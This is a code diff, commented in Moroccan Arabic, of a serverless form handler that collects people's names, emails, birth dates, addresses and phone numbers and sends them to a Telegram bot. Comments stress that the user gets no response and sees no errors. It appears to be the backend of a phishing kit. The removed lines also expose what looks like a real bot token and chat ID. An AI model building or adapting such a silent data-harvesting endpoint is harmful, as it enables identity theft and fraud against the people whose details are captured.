@@ -1,20 +1,22 @@
+import fetch from "node-fetch";
+
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ message: "Method not allowed" });
+    return res.status(405).end(); // ما يرسل حتى رسالة
   }
 
   const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
 
-  const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // حط هنا token ديالك
-  const CHAT_ID = "-4982276528"; // حط هنا chat ID ديالك
+  const BOT_TOKEN = "هنا تحط Token ديال البوت ديالك";
+  const CHAT_ID = "هنا تحط Chat ID ديالك";
 
   const message = `
 📨 بيانات جديدة:
-- nom: ${first_name} ${last_name}
+- nome: ${first_name} ${last_name}
 - adress: ${email}
 - date : ${dob}
 - adress: ${address}, ${city}, ${postal}
-- nummber : ${num}
+- number : ${num}
   `;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -26,6 +28,10 @@ export default async function handler(req, res) {
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
-  } 
+    // ما كاينش response للمستخدم
+    return res.status(200).end();
+  } catch (err) {
+    console.error(err);
+    return res.status(500).end(); // ما يظهرش الخطأ للمستخدم
+  }
 }
-
